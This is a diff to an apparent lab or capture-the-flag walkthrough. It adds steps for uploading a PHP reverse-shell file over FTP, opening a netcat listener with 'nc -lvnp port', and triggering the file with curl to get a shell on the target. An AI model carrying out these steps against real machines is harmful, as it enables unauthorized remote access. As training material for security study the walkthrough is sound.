@@ -191,8 +191,15 @@ Netcat (nc) is a simple, powerful command-line networking tool—"Swiss Army kni
 <br>
 <br>
     ***This is where we will be using 2-3 terminal windows.***
-
     Terminal 1: <br>
+    The terminal with FTP still active.
+    Run in this command:
+    ```
+    put php-reversal-shell.php
+    ```
+    This is an injection to gain access to the machine.
+    
+    Terminal 2: <br>
     We will be using netcat to listen now.
     Run this command:  `nc -lvnp port` 
 
@@ -203,7 +210,7 @@ Netcat (nc) is a simple, powerful command-line networking tool—"Swiss Army kni
 
     #### **Go to the browser to check if the file has been uploaded.**
 
-    Terminal 2: <br>
+    Terminal 3: <br>
     Once you have confirmed the file exists, we are going to use a curl command to "activate" this file.
     Open up a second terminal and run this command.
     ```
